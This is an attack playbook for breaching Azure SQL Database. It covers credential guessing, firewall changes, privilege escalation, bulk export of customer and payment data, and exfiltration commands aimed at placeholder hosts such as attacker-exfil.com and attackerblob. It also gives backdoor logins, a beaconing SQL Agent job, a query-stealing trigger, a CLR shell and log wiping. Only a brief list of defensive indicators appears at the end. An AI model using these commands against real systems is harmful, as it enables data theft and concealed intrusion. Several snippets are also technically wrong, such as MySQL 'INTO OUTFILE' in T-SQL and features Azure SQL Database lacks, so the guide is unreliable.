# Azure SQL Database Exploitation & Exfiltration

## Overview

Azure SQL Database is frequently the most valuable target in Azure environments due to:
- Storage of sensitive business data
- High-value information (PII, financial records, customer data)
- Often inadequate firewall configurations
- Weak default authentication policies
- Poor audit logging on older databases

---

## Access Vectors

### 1. Authentication Bypass

#### SQL Authentication with Weak Credentials

```bash
# Enumerate Azure SQL servers
az sql server list --output table

# Attempt connection with leaked/guessed credentials
sqlcmd -S {server}.database.windows.net -U {username} -P {password} -d master

# Check default credentials
# Common defaults: admin, sa, Admin@1234, Passw0rd!, P@ssw0rd

# If successful, identify available databases
1> SELECT name FROM sys.databases;
2> GO

# Check for sensitive database names
# Common: payroll, customers, financial, credentials, secrets
```

#### Azure AD Authentication

```bash
# Get current user context
az account show

# Connect to SQL using AAD token
# Method 1: Azure CLI authentication
az sql db query --resource-group {rg} --server {server} --database {db} \
  --query "SELECT @@version"

# Method 2: PowerShell with AAD token
$token = (Get-AzAccessToken -ResourceUrl https://database.windows.net).Token
$connection = New-Object System.Data.SqlClient.SqlConnection
$connection.ConnectionString = "Server=tcp:{server}.database.windows.net,1433;Initial Catalog={db};Encrypt=True;TrustServerCertificate=False;Connection Timeout=30;Authentication=Active Directory Token"
$connection.AccessToken = $token
$connection.Open()

# Execute query
$command = $connection.CreateCommand()
$command.CommandText = "SELECT * FROM sensitive_table"
```

### 2. Network Access Bypass

#### Firewall Rule Modification

```bash
# List current firewall rules
az sql server firewall-rule list --resource-group {rg} --server {server}

# If you have access to modify rules
az sql server firewall-rule create --resource-group {rg} --server {server} \
  --name AllowAttacker --start-ip-address {attacker-ip} --end-ip-address {attacker-ip}

# Alternatively, modify existing rule to allow 0.0.0.0/0
az sql server firewall-rule update --resource-group {rg} --server {server} \
  --name AllowAllAzureIps --start-ip-address 0.0.0.0 --end-ip-address 255.255.255.255
```

#### Azure Services Bypass

```bash
# If "Allow Azure services and resources to access this server" is enabled
# You can connect from any Azure service

# Create Azure VM or function to connect
# Then connect from that service
sqlcmd -S {server}.database.windows.net -U {username} -P {password}
```

### 3. Privilege Escalation

#### Database Admin Escalation

```bash
# If connected as regular user, attempt escalation
# Check current permissions
SELECT name, type, type_desc 
FROM sys.database_principals 
WHERE name = SYSTEM_USER;

# Check if current user can create other users
CREATE USER [hacker@domain.com] FROM EXTERNAL PROVIDER;
ALTER ROLE db_owner ADD MEMBER [hacker@domain.com];

# If db_owner role obtained
ALTER ROLE db_owner ADD MEMBER [attacker@domain.com];

# Alternative: Add yourself to SQL authentication
CREATE LOGIN [AttackerLogin] WITH PASSWORD = 'P@ssw0rd123!';
CREATE USER [AttackerUser] FOR LOGIN [AttackerLogin];
ALTER ROLE db_owner ADD MEMBER [AttackerUser];
```

#### Server Admin Escalation

```bash
# If you have db_owner on master database
# You can escalate to server admin

# First, get server admin role details
SELECT * FROM sys.server_principals WHERE type = 'S' AND name LIKE '%admin%';

# If you can modify logins
ALTER SERVER ROLE sysadmin ADD MEMBER [AttackerLogin];

# Verify escalation
SELECT is_srvrolemember('sysadmin', 'AttackerLogin');
```

---

## Data Extraction

### 1. Identify Valuable Data

```sql
-- Find tables with sensitive columns
SELECT TABLE_NAME, COLUMN_NAME 
FROM INFORMATION_SCHEMA.COLUMNS 
WHERE COLUMN_NAME LIKE '%password%' 
   OR COLUMN_NAME LIKE '%credit%'
   OR COLUMN_NAME LIKE '%social%'
   OR COLUMN_NAME LIKE '%ssn%'
   OR COLUMN_NAME LIKE '%token%'
   OR COLUMN_NAME LIKE '%secret%';

-- Find largest tables (likely data stores)
SELECT name, rows
FROM sysindexes
WHERE indid in (0,1) and name not like 'sys%'
ORDER BY rows DESC;

-- List all databases
SELECT name FROM sys.databases;

-- Find encrypted columns
SELECT * FROM sys.columns 
WHERE encryption_type IS NOT NULL;
```

### 2. Bulk Data Export

```sql
-- Export to CSV format
SELECT 'customers' as [Table]
UNION ALL
SELECT CAST(customer_id AS VARCHAR) + ',' + email + ',' + phone 
FROM customers
INTO OUTFILE '/var/tmp/customers.csv';

-- Export using bcp utility
bcp "SELECT * FROM database.dbo.sensitive_table" queryout customers.csv \
  -S {server}.database.windows.net \
  -U {username} \
  -P {password} \
  -d {database} \
  -c

-- Export to Azure Storage (if access available)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

DECLARE @OLEResult INT;
DECLARE @FSO INT;
EXEC @OLEResult = sp_OACreate 'Scripting.FileSystemObject', @FSO OUT;

-- Execute system commands to upload data
EXEC xp_cmdshell 'powershell.exe -Command "azcopy copy C:\exported_data\* https://attackerblob.blob.core.windows.net/container/"'
```

### 3. Exfiltrate via Different Channels

```sql
-- Export via XML
SELECT * FROM sensitive_table FOR XML RAW, ELEMENTS;

-- Export via JSON
SELECT * FROM sensitive_table FOR JSON AUTO;

-- Export via XML and write to file
SELECT * FROM sensitive_table FOR XML RAW ('Row') 
INTO OUTFILE '\\\\attacker.com\\share\\data.xml';

-- Use PowerShell for encrypted upload
$data = sqlcmd -S {server}.database.windows.net -U {user} -P {pass} -d {db} -Q "SELECT * FROM sensitive_table"
$encrypted = ConvertTo-SecureString -String $data -AsPlainText -Force
$bytes = [System.Text.Encoding]::UTF8.GetBytes($encrypted)
Invoke-WebRequest -Uri "https://attacker-exfil.com/upload" -Method Post -Body $bytes
```

---

## Persistence

### 1. Backdoor Accounts

```sql
-- Create SQL login for persistence
CREATE LOGIN [maintenance] WITH PASSWORD = 'P@ssw0rd_Persistence_123!';

-- Create database user
CREATE USER [maintenance] FOR LOGIN [maintenance];

-- Grant high privileges
ALTER ROLE db_owner ADD MEMBER [maintenance];
ALTER SERVER ROLE sysadmin ADD MEMBER [maintenance];

-- Create user with hidden password
CREATE LOGIN [system_backup] WITH PASSWORD = 'Complex_P@ssw0rd_123456789!';
ALTER LOGIN [system_backup] DISABLE;  -- Hide by disabling then re-enabling
ALTER LOGIN [system_backup] ENABLE;

-- Set expiration far in the future
ALTER LOGIN [maintenance] WITH CHECK_EXPIRATION = OFF;
ALTER LOGIN [maintenance] WITH CHECK_POLICY = OFF;
```

### 2. Trigger-Based Backdoors

```sql
-- Create trigger that logs all queries
CREATE TRIGGER audit_trigger 
ON DATABASE 
FOR CREATE_TABLE, ALTER_TABLE, DROP_TABLE 
AS
BEGIN
  DECLARE @user NVARCHAR(128) = SYSTEM_USER;
  DECLARE @query NVARCHAR(MAX) = EVENTDATA().value('(/EVENT_INSTANCE/TSQLCommand/CommandText)[1]','NVARCHAR(MAX)');
  
  -- Send to attacker infrastructure
  EXEC msdb.dbo.sp_send_dbmail 
    @profile_name = 'default',
    @recipients = 'attacker@external.com',
    @body = @query,
    @subject = 'Database Change: ' + @user;
END;

-- Create trigger to execute commands on specific query
CREATE TRIGGER backdoor_trigger
ON DATABASE
FOR INSERT
AS
BEGIN
  IF EXISTS (SELECT * FROM inserted WHERE column_name = 'trigger_code')
  BEGIN
    EXEC xp_cmdshell 'cmd.exe /c powershell.exe -Command ...'
  END
END;
```

### 3. Job-Based Persistence

```sql
-- Create SQL Agent job for scheduled execution
USE msdb;
GO

EXEC dbo.sp_add_job 
  @job_name = N'system_maintenance',
  @enabled = 1,
  @description = N'Routine maintenance';

EXEC dbo.sp_add_jobstep 
  @job_name = N'system_maintenance',
  @step_name = N'backup',
  @subsystem = N'TSQL',
  @command = N'EXEC xp_cmdshell ''powershell.exe -Command "Invoke-WebRequest -Uri https://attacker.com/beacon -Method Post"''',
  @database_name = 'master';

EXEC dbo.sp_add_schedule 
  @schedule_name = N'every_hour',
  @freq_type = 4,
  @freq_interval = 1,
  @active_start_time = 0;

EXEC dbo.sp_attach_schedule 
  @job_name = N'system_maintenance',
  @schedule_name = N'every_hour';

EXEC dbo.sp_add_jobserver 
  @job_name = N'system_maintenance',
  @server_name = N'(local)';
```

---

## Detection Evasion

### 1. Hide Queries from Audit Logs

```sql
-- Disable audit logging
ALTER DATABASE {database_name} SET AUDIT OFF;

-- Clear audit logs
USE msdb;
DROP TABLE IF EXISTS audit_logs;

-- Execute queries from SQL agent (less visible)
USE msdb;
EXEC sp_add_jobstep 
  @job_name = 'maintenance',
  @step_name = 'sensitive_query',
  @subsystem = 'TSQL',
  @command = 'SELECT * FROM sensitive_table';
```

### 2. Obfuscate Queries

```sql
-- Use dynamic SQL
DECLARE @sql NVARCHAR(MAX) = 'SELECT * FROM ' + CHAR(99) + CHAR(117) + CHAR(115) + CHAR(116) + CHAR(111) + CHAR(109) + CHAR(101) + CHAR(114) + CHAR(115);
EXEC sp_executesql @sql;

-- Use encryption
CREATE FUNCTION [dbo].[ExecuteEncrypted] (@EncryptedCommand NVARCHAR(MAX))
RETURNS INT
WITH ENCRYPTION
AS
BEGIN
  DECLARE @sql NVARCHAR(MAX);
  -- Decryption logic here
  EXEC sp_executesql @sql;
  RETURN 0;
END;
```

### 3. Clean Logs

```sql
-- Clear transaction logs
USE master;
ALTER DATABASE {database_name} SET RECOVERY SIMPLE;
DBCC SHRINKFILE (N'{database_name}_log', 1);

-- Delete from sys.dm_exec_query_stats
DBCC DROPCLEANBUFFERS;

-- Clear SQL Agent job history
USE msdb;
EXEC dbo.sp_purge_jobhistory;

-- Remove backup history
EXEC msdb.dbo.sp_delete_backuphistory @oldest_date = GETDATE();
```

---

## Advanced Extraction via CLR

```sql
-- Create CLR assembly for code execution
CREATE ASSEMBLY [shell]
FROM 0x4D5A90000300000004000000...;  -- Compiled assembly bytes

CREATE FUNCTION shell(@cmd NVARCHAR(MAX))
RETURNS NVARCHAR(MAX)
AS EXTERNAL NAME [shell].[ShellClass].[Execute];

-- Execute system commands
SELECT dbo.shell('powershell.exe -Command "Get-ChildItem | Out-String"');

-- Use to exfiltrate data
SELECT dbo.shell('curl -X POST -F "file=@C:\sensitive\data.csv" https://attacker.com/upload');
```

---

## Real-World Extraction Scenario

```bash
# 1. Reconnaissance
sqlcmd -S vulnerable-db.database.windows.net -U admin -P "Default@1234" -d master \
  -Q "SELECT name FROM sys.databases;" -o databases.txt

# 2. Identify sensitive database
sqlcmd -S vulnerable-db.database.windows.net -U admin -P "Default@1234" -d customers \
  -Q "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;" -o tables.txt

# 3. Check table sizes
sqlcmd -S vulnerable-db.database.windows.net -U admin -P "Default@1234" -d customers \
  -Q "SELECT name, rows FROM sysindexes WHERE indid in (0,1) ORDER BY rows DESC;" -o table_sizes.txt

# 4. Export largest table
bcp "SELECT * FROM customers.dbo.payment_records" queryout payment_records.csv \
  -S vulnerable-db.database.windows.net \
  -U admin \
  -P "Default@1234" \
  -d customers \
  -c

# 5. Compress and upload
7z a -mx9 -p"encrypted_pass" payment_records.7z payment_records.csv
curl -X POST -F "file=@payment_records.7z" https://attacker-exfil.com/upload

# 6. Install persistence
sqlcmd -S vulnerable-db.database.windows.net -U admin -P "Default@1234" -d master \
  -i persistence.sql

# 7. Clean logs
sqlcmd -S vulnerable-db.database.windows.net -U admin -P "Default@1234" -d master \
  -i clean_logs.sql
```

---

## Defensive Indicators

Organizations should monitor for:
- Failed login attempts with different users
- Creation of new SQL logins/users
- Changes to database roles and permissions
- Execution of xp_cmdshell or CLR assemblies
- Unusual bulk export operations
- Drops or disables on audit logging
- Job creation outside change management
- SQL Agent job executions at unusual times
- Large result set downloads
- Connections from unexpected IP ranges
